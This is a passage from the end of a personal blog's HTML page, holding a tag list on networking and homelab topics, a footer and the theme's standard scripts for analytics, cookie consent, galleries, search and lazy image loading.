is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Chromium/"><span class="tag">Chromium</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/DNS/"><span class="tag">DNS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hexo/"><span class="tag">Hexo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Network/"><span class="tag">Network</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WireGuard/"><span class="tag">WireGuard</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bangumi/"><span class="tag">bangumi</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flexget/"><span class="tag">flexget</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/homelab/"><span class="tag">homelab</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/plex/"><span class="tag">plex</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tutorial/"><span class="tag">tutorial</span><span class="tag">1</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://kur4ge.oss-accelerate.aliyuncs.com/img/logo.png?no-lazy" alt="Kur4ge&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 Kur4ge</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN")</script><script>var IcarusThemeSettings={article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="https://kur4ge.oss-accelerate.aliyuncs.com/js/column.js"></script><script src="https://kur4ge.oss-accelerate.aliyuncs.com/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="https://kur4ge.oss-accelerate.aliyuncs.com/js/back_to_top.js" defer></script><script src="https://s9.cnzz.com/z_stat.php?id=1280699896&amp;web_id=1280699896" async></script><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load",()=>{window.cookieconsent.initialise({type:"info",theme:"edgeless",static:!1,position:"bottom-left",content:{message:"此网站使用Cookie来改善您的体验。",dismiss:"知道了！",allow:"允许使用Cookie",deny:"拒绝",link:"了解更多",policy:"Cookie政策",href:"https://www.cookiesandyou.com/"},palette:{popup:{background:"#edeff5",text:"#838391"},button:{background:"#4b81e8"}}})})</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load",()=>{"function"==typeof $.fn.lightGallery&&$(".article").lightGallery({selector:".gallery-item"}),"function"==typeof $.fn.justifiedGallery&&($(".justified-gallery > p > .gallery-item").length&&$(".justified-gallery > p > .gallery-item").unwrap(),$(".justified-gallery").justifiedGallery())})</script><script src="https://kur4ge.oss-accelerate.aliyuncs.com/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="https://kur4ge.oss-accelerate.aliyuncs.com/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",(function(){loadInsight({contentUrl:"/content.json"},{hint:"想要查找什么...",untitled:"(无标题)",posts:"文章",pages:"页面",categories:"分类",tags:"标签"})}))</script><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>